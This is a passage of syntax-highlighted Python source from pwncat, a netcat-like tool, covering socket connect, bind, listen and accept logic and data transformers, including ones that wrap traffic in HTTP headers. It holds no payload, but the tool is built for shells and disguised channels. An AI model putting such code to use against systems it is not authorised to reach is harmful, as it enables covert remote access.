                    errors.append(str(err))
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
                self.__log.error(<span class="hljs-string">"Resolve Error: %s"</span>, error)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/4] Connect</span>
        remove = []
        errors = []
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
        <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
                <span class="hljs-keyword">try</span>:
                    self.__sock.connect(
                        conns[family][<span class="hljs-string">"conn"</span>],
                        conns[family][<span class="hljs-string">"remote_addr"</span>],
                        conns[family][<span class="hljs-string">"remote_port"</span>],
                        self.__options.src_addr,
                        self.__options.src_port,
                        self.__options.udp_sconnect,
                        self.__enc.encode(self.__options.udp_sconnect_word),
                        self.__options.bufsize,
                    )
                    <span class="hljs-comment"># On successful connect, we can abandon/remove all other sockets</span>
                    remove = [key <span class="hljs-keyword">for</span> key <span
                            class="hljs-keyword">in</span> conns <span
                            class="hljs-keyword">if</span> key != family]
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">except</span> (OSError, socket.error) <span
                            class="hljs-keyword">as</span> err:
                    remove.append(family)
                    errors.append(str(err))
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
                self.__log.error(error)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [4/4] Store connections and set active connection</span>
        <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            self.__active = {
                <span class="hljs-string">"af"</span>: family,
                <span class="hljs-string">"conn"</span>: conns[family][<span class="hljs-string">"conn"</span>],
                <span class="hljs-string">"remote_addr"</span>: conns[family][<span
                            class="hljs-string">"remote_addr"</span>],
                <span class="hljs-string">"remote_port"</span>: conns[family][<span
                            class="hljs-string">"remote_port"</span>],
            }
        <span class="hljs-comment"># Store sockets as a list</span>
        self.__conns = conns
        <span class="hljs-comment"># Print socket info</span>
        <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                            class="hljs-string">"conn"</span>], self.__options.info):
            self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_server</span>(<span
            class="hljs-params">self, host, port</span>):</span>
        <span class="hljs-comment"># type: (Optional[str], int) -&gt; bool</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Integrate: --rebind(-wait|-robin)</span>
        <span class="hljs-string">"""Run and create a TCP or UDP listening server and wait for a client to connect.

        Args:
            addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
            port (int): Port of the address to bind to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># The connection dictionary.</span>
        conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># [1/4] Create socket</span>
        succ = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">try</span>:
                conns[family] = {
                    <span class="hljs-string">"sock"</span>: self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM <span
                            class="hljs-keyword">if</span> self.__options.udp <span
                            class="hljs-keyword">else</span> socket.SOCK_STREAM,
                        <span class="hljs-literal">True</span>,
                        self.__options.ip_tos,
                    )
                }
                succ += <span class="hljs-number">1</span>
            <span class="hljs-keyword">except</span> socket.error <span
                            class="hljs-keyword">as</span> err:
                self.__log.debug(err)
        <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
            self.__log.error(<span
                            class="hljs-string">"Socket Error: Could not create any socket."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] Resolve local address</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                conns[family][<span class="hljs-string">"local_addr"</span>] = self.__sock.gethostbyname(
                    host, family, <span class="hljs-keyword">not</span> self.__options.nodns
                )
                conns[family][<span class="hljs-string">"local_host"</span>] = host
                conns[family][<span class="hljs-string">"local_port"</span>] = port
            <span class="hljs-keyword">except</span> socket.gaierror <span
                            class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span class="hljs-string">"Resolve Error: Could not resolve any hostname"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/4] Bind socket</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                self.__sock.bind(conns[family][<span class="hljs-string">"sock"</span>], conns[family][<span
                            class="hljs-string">"local_addr"</span>], port)
            <span class="hljs-keyword">except</span> socket.error <span
                            class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span
                            class="hljs-string">"Bind Error: Could not bind any socket"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [UDP 4/4] There is no listen or accept for UDP</span>
        <span class="hljs-keyword">if</span> self.__options.udp:
            <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
                conns[family][<span class="hljs-string">"conn"</span>] = conns[family][<span
                            class="hljs-string">"sock"</span>]
                self.__log.info(
                    <span class="hljs-string">"Listening on %s:%d (family %d/%s, UDP)"</span>,
                    conns[family][<span class="hljs-string">"local_addr"</span>],
                    conns[family][<span class="hljs-string">"local_port"</span>],
                    family,
                    self.__sock.get_family_name(family),
                )
            self.__conns = conns
            self.__udp_mode_server = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [TCP 4/4] Requires listen and accept</span>
        <span class="hljs-comment"># (1/3) Listen</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                self.__sock.listen(conns[family][<span class="hljs-string">"sock"</span>], self.__options.backlog)
                self.__log.info(
                    <span class="hljs-string">"Listening on %s:%d (family %d/%s, TCP)"</span>,
                    conns[family][<span class="hljs-string">"local_addr"</span>],
                    conns[family][<span class="hljs-string">"local_port"</span>],
                    family,
                    self.__sock.get_family_name(family),
                )
            <span class="hljs-keyword">except</span> socket.error <span
                            class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span class="hljs-string">"Could not listen on any address"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># (2/3) Accept</span>
        remove = {}
        <span class="hljs-keyword">try</span>:
            conn, client = self.__sock.accept(
                [conns[family][<span class="hljs-string">"sock"</span>] <span class="hljs-keyword">for</span> family <span
                            class="hljs-keyword">in</span> conns], self.__ssig.has_sock_quit
            )
            conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
            conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                            class="hljs-number">0</span>]
            conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                            class="hljs-number">1</span>]
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> err:
            remove = {family: str(err) <span class="hljs-keyword">for</span> family <span
                            class="hljs-keyword">in</span> conns}
        <span class="hljs-comment"># On error, remove all bind sockets</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># (3/3) Store connections</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                            class="hljs-keyword">in</span> conns[family]:
                self.__active = {
                    <span class="hljs-string">"af"</span>: family,
                    <span class="hljs-string">"conn"</span>: conns[family][<span
                            class="hljs-string">"conn"</span>],
                    <span class="hljs-string">"remote_addr"</span>: conns[family][<span
                            class="hljs-string">"remote_addr"</span>],
                    <span class="hljs-string">"remote_port"</span>: conns[family][<span
                            class="hljs-string">"remote_port"</span>],
                }
                <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                            class="hljs-string">"conn"</span>], self.__options.info):
                    self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
        self.__conns = conns
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_accept_client</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Re-accept new clients, if connection is somehow closed or accept did not work.

        Returns:
            bool: Returns `True` on success and `False` and error.
        """</span>
        <span class="hljs-comment"># [1/3] Close and remove all previous conn sockets</span>
        self.close_conn_sock()
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                            class="hljs-keyword">in</span> self.__conns[family]:
                <span class="hljs-keyword">del</span> self.__conns[family][<span
                            class="hljs-string">"conn"</span>]

        <span class="hljs-comment"># [2/3] Accept</span>
        <span class="hljs-keyword">try</span>:
            conn, client = self.__sock.accept(
                [self.__conns[family][<span class="hljs-string">"sock"</span>] <span
                            class="hljs-keyword">for</span> family <span
                            class="hljs-keyword">in</span> self.__conns], self.__ssig.has_sock_quit
            )
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        self.__conns[conn.family][<span class="hljs-string">"conn"</span>] = conn
        self.__conns[conn.family][<span class="hljs-string">"remote_addr"</span>] = client[<span
                            class="hljs-number">0</span>]
        self.__conns[conn.family][<span class="hljs-string">"remote_port"</span>] = client[<span
                            class="hljs-number">1</span>]

        <span class="hljs-comment"># Update active connection socket</span>
        self.__active = {
            <span class="hljs-string">"af"</span>: conn.family,
            <span class="hljs-string">"conn"</span>: conn,
            <span class="hljs-string">"remote_addr"</span>: client[<span
                            class="hljs-number">0</span>],
            <span class="hljs-string">"remote_port"</span>: client[<span
                            class="hljs-number">1</span>],
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close_bind_sock</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the bind socket used by the server to accept clients."""</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"sock"</span> <span
                            class="hljs-keyword">in</span> self.__conns[family]:
                self.__sock.close(self.__conns[family][<span
                            class="hljs-string">"sock"</span>], <span
                            class="hljs-string">"sock"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close_conn_sock</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the communication socket used for send and receive."""</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__conns:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"conn"</span> <span
                            class="hljs-keyword">in</span> self.__conns[family]:
                self.__sock.close(self.__conns[family][<span
                            class="hljs-string">"conn"</span>], <span
                            class="hljs-string">"conn"</span>)


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   5 / 11   T R A N S F O R M E R</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [5/11 TRANSFORM]: (1/5): Transform</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">Transform</span>(<span class="hljs-params">ABC</span>):</span>  <span
                            class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Abstract class to for pwncat I/O transformers.

    This is a skeleton that defines how the transformer for pwncat should look like.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer."""</span>
        super(Transform, self).__init__()
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Implement a transformer function which transforms a string..

        Args:
            data (bytes): data to be transformed.

        Returns:
            bytes: The transformed string.
        """</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [5/11 TRANSFORM]: (2/5) TransformLinefeed</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformLinefeed</span>(<span
        class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement basic linefeed replacement."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (DsTransformLinefeed) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformLinefeed, self).__init__()
        self.__opts = opts

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Transform linefeeds to CRLF, LF or CR if requested.

        Returns:
            str: The string with altered linefeeds.
        """</span>
        <span class="hljs-comment"># 'auto' keep it as it is</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> data

        <span class="hljs-comment"># ? -&gt; No line feeds</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                            class="hljs-string">"no"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Removing CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>]
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Removing LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Removing CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
        <span class="hljs-comment"># ? -&gt; CRLF</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                            class="hljs-string">"crlf"</span> <span class="hljs-keyword">and</span> data[<span
                            class="hljs-number">-2</span>:] != StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>):
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing LF with CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CR with CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>)
        <span class="hljs-comment"># ? -&gt; LF</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                            class="hljs-string">"lf"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CRLF with LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\n"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CR with LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\n"</span>)
        <span class="hljs-comment"># ? -&gt; CR</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                            class="hljs-string">"cr"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CRLF with CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\r"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                            class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing LF with CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                            class="hljs-string">"\r"</span>)

        <span class="hljs-comment"># Otherwise just return it as it is</span>
        <span class="hljs-keyword">return</span> data


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [5/11 TRANSFORM]: (3/5) TransformSafeword</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformSafeword</span>(<span
        class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a trigger to emergency shutdown upon receival of a specific safeword."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (DsTransformSafeword) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformSafeword, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Raise a stop signal upon receiving the safeword.

        Returns:
            str: The string as it is without changes
        """</span>
        <span class="hljs-keyword">if</span> StringEncoder.encode(self.__opts.safeword) <span
                            class="hljs-keyword">in</span> data:
            self.log.trace(<span class="hljs-string">"TERMINATE signal RAISED in TransformSafeword.transform"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
            self.__opts.ssig.raise_terminate()
        <span class="hljs-keyword">return</span> data


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [5/11 TRANSFORM]: (4/5) TransformHttpPack</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformHttpPack</span>(<span
        class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a transformation to pack data into HTTP packets."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, str]) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformHttpPack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

        <span class="hljs-keyword">assert</span> <span class="hljs-string">"reply"</span> <span
                            class="hljs-keyword">in</span> opts
        <span class="hljs-keyword">assert</span> opts[<span
                            class="hljs-string">"reply"</span>] <span class="hljs-keyword">in</span> [<span
                            class="hljs-string">"request"</span>, <span class="hljs-string">"response"</span>]

        <span class="hljs-comment"># Initial default header</span>
        self.__headers = [
            <span class="hljs-string">"Accept-Charset: utf-8"</span>,
        ]

        self.__response_headers_sent = <span class="hljs-literal">False</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Wrap data into a HTTP packet.

        Returns:
            bytes: The wrapped string.
        """</span>
        request_header = [
            <span class="hljs-string">"POST / HTTP/1.1"</span>,
            <span class="hljs-string">"Host: {}"</span>.format(self.__opts[<span
                            class="hljs-string">"host"</span>]),
            <span class="hljs-string">"User-Agent: pwncat"</span>,
            <span class="hljs-string">"Accept: */*"</span>,
            <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
            <span class="hljs-string">"Content-Type: text/plain; charset=UTF-8"</span>,
        ]
        response_header = [
            <span class="hljs-string">"HTTP/1.1 200 OK"</span>,
            <span class="hljs-string">"Date: {}"</span>.format(self.__get_date()),
            <span class="hljs-string">"Server: pwncat"</span>,
            <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
            <span class="hljs-string">"Connection: close"</span>,
        ]

        self.__response_headers_sent = <span class="hljs-literal">True</span>

        <span class="hljs-keyword">if</span> self.__opts[<span class="hljs-string">"reply"</span>] == <span
                            class="hljs-string">"request"</span>:
            header = StringEncoder.encode(
                <span class="hljs-string">"\n"</span>.join(request_header) + <span
                            class="hljs-string">"\n"</span> + <span class="hljs-string">"\n"</span>.join(self.__headers) + <span
                            class="hljs-string">"\n\n"</span>
            )
        <span class="hljs-keyword">else</span>:
            header = StringEncoder.encode(
                <span class="hljs-string">"\n"</span>.join(response_header) + <span
                            class="hljs-string">"\n"</span> + <span class="hljs-string">"\n"</span>.join(self.__headers) + <span
                            class="hljs-string">"\n\n"</span>
            )
        <span class="hljs-keyword">return</span> header + data

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_date</span>(<span
            class="hljs-params">self</span>):</span>  <span class="hljs-comment"># pylint: disable=no-self-use</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        now = datetime.utcnow()
        weekday = [<span class="hljs-string">"Mon"</span>, <span
                            class="hljs-string">"Tue"</span>, <span class="hljs-string">"Wed"</span>, <span
                            class="hljs-string">"Thu"</span>, <span class="hljs-string">"Fri"</span>, <span
                            class="hljs-string">"Sat"</span>, <span class="hljs-string">"Sun"</span>][now.weekday()]
        month = [
            <span class="hljs-string">"Jan"</span>,
            <span class="hljs-string">"Feb"</span>,
            <span class="hljs-string">"Mar"</span>,
            <span class="hljs-string">"Apr"</span>,
            <span class="hljs-string">"May"</span>,
            <span class="hljs-string">"Jun"</span>,
            <span class="hljs-string">"Jul"</span>,
            <span class="hljs-string">"Aug"</span>,
            <span class="hljs-string">"Sep"</span>,
            <span class="hljs-string">"Oct"</span>,
            <span class="hljs-string">"Nov"</span>,
            <span class="hljs-string">"Dec"</span>,
        ][now.month - <span class="hljs-number">1</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">"%s, %02d %s %04d %02d:%02d:%02d GMT"</span> % (
            weekday,
            now.day,
            month,
            now.year,
            now.hour,
            now.minute,
            now.second,
        )


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [5/11 TRANSFORM]: (5/5) TransformHttpUnpack</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformHttpUnpack</span>(<span
        class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a transformation to unpack data from HTTP packets."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, str]) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformHttpUnpack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
